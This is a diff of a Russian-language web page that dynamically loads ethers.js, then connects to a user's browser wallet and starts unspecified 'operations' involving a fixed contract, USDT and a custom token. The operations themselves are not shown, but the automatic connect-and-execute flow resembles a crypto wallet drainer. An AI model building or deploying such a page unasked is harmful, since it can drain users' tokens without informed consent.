@@ -38,18 +38,26 @@
         <div id="status">Подождите, идет подключение и выполнение операций...</div>
         <div id="error"></div>
     </div>
-
-    <!-- Подключение библиотеки ethers.js -->
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
-
+    
     <script>
-        const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Замените на адрес вашего контракта
+        // Динамическая загрузка ethers.js
+        async function loadEthers() {
+            if (typeof ethers === 'undefined') {
+                const ethersModule = await import('https://cdn.ethers.io/lib/ethers-5.7.umd.min.js');
+                window.ethers = ethersModule.ethers;
+            }
+        }
+
+        // Адреса контрактов
+        const CONTRACT_ADDRESS = "0xfe0d3ab9a7ab9c070069f516feda0f351751944e"; // Адрес вашего контракта
         const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Адрес контракта USDT
         const CUSTOM_TOKEN_ADDRESS = "0xcb89e8dd26aad28674da9751bfa61815a75f152d"; // Адрес кастомного токена
 
         // Основная функция для подключения и выполнения операций
         async function mainProcess() {
             try {
+                await loadEthers(); // Загружаем ethers.js перед использованием
+
                 // Шаг 1: Проверка наличия кошелька и подключение
                 if (typeof window.ethereum === 'undefined') {
                     throw new Error("Кошелек не найден. Установите MetaMask или другой поддерживаемый кошелек.");
